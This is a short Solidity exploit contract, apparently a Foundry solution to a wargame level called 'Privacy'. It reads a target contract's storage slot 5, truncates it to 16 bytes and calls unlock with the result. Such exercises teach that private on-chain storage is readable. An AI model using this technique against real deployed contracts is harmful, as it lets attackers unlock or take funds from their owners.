
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Privacy/Privacy.sol";
import "exploits/BlockUtils.sol";
import "lib/forge-std/src/console.sol";

contract PrivacyExploit is BlockUtils {
    Privacy public victim;

    constructor(address _victim) {
        victim = Privacy(payable(_victim));
    }

    function hack() public {
       console.log("victim locked", victim.locked());
       bytes32 full = peekStorage(address(victim), 5);
       bytes16 key = bytes16(full); // first 16 bytes
       victim.unlock(key);

    }

    receive() external payable {
    }
}
